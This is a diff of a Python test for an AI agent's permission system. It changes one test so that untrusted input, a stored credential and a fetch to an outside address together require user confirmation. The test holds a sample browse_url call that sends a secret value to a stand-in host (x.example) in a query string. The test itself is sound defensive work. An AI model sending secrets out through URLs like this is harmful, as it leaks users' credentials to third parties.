@@ -429,10 +429,10 @@ def test_every_text_of_the_setting_is_in_both_languages():
         assert i18n.count(f'"{key}":') == 2, key
 
 
-def test_at_the_auto_level_a_page_a_secret_and_an_address_together_ask_nothing(ws, fetched):
+def test_at_the_auto_level_a_page_a_secret_and_an_address_together_still_ask(ws, fetched):
     pm, confirm = manager(mode=PermissionLevel.AUTO)
     pm.note_untrusted_input("a page")
     pm.note_private_data("a stored credential")
     secrets = SecretsBroker({"K": "supersecretvalue"})
     run(ws, [call("browse_url", {"url": "https://x.example/?x=supersecretvalue"}, "a"), say("done")], permissions=pm, secrets=secrets)
-    assert confirm.asked == [] and len(fetched) == 1
+    assert confirm.asked and not fetched
